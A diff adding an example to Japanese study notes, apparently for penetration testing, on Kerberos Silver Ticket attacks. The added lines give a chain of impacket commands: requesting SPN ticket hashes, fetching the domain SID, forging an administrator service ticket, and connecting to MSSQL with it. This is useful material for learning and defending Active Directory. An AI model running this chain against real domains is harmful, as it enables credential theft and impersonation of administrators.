@@ -45,3 +45,12 @@ Silver Ticket は偽造された TGS (Ticket Granting Service) チケットで�
 １：サービス アカウントのパスワードの NTLM ハッシュ。
 ２：ドメインのSID
 ３：アカウントに関連付けられたサービス プリンシパル名 (SPN)。
+＃例
+//SPNとパスワードハッシュを入手（ハッシュは解析したあとにNTLMハッシュに変換）
+impacket-GetUserSPNs <domain>/<user>:<pass> -dc-host <dc name> -request -k
+//SIDを入手
+impacket-getPac -targetUser administrator <domain>/<user>:<pass>
+//SPN、NTLMハッシュ、SIDでシルバーチケットを作成
+impacket-ticketer -nthash <NTLM hash> -domain-sid <SID> -domain <domain> -dc-ip <IP> -spn <SPN> administrator
+//チケットを使ってケルベロスに接続
+KRB5CCNAME=administrator.ccache impacket-mssqlclient -k <dc name>
